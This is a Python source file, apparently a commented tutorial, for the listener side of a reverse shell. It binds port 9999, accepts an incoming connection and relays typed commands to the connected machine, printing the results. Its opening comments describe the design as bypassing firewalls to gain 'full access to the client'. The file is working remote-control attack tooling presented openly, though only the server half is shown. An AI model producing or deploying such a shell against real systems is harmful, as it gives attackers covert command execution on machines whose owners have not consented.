#Reverse Shell uses a CLIENT initiated connection
#It connects to the server
#As it is initiated from the client, the firewall is bypassed and server can get full access to the client

import socket

# This sys module contains functions which you would run in a command line. You can run them from Python too
import sys

#Creation of Socket
def socket_create():
    try:
        global host #IP of the server
        global port
        global s
        host = ''
        port = 9999 #Port to listen to
        s = socket.socket()
    except socket.error as msg:
        print("Socket Creation error : ",str(msg))

#Bind Socket to port and LISTEN
def socket_bind():
    try:
        global host
        global port
        global s
        print("Binding socket to port "+ str(port))
        s.bind((host,port))
        s.listen(5)
    except socket.error as msg:
        print("Socket binding error",str(msg),"\n","Retrying")
        socket_bind()

#Establishing a connection with the client
def socket_accept():
    #address stores the address of whichever IP is connected in first element and PORT number in the 2nd
    conn,address = s.accept()  #s.accept waits until a connection is received. Code is not executed ahead until then
    print("Connection has been established  |" + "IP" + address[0] + "| Port" + str(address[1]))
    send_commands(conn)
    conn.close()

#Send commands
def send_commands(conn):
    while True:
        cmd = input()
        if cmd== 'quit':
            conn.close()
            s.close()
            sys.exit()
        #CMD commands are stored as type bytes, hence they need to be encoded
        #When they are sent accross a network, they are bytes
        #When sent to the user, they are strings
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            #The data is received in bytes, so need to convert it to string
            client_response = str(conn.recv(1024),"utf-8")
            #end = '' tells the print function not to insert a \n at the end
            print(client_response,end="")

def main():
    socket_create()
    socket_bind()
    socket_accept()


main()











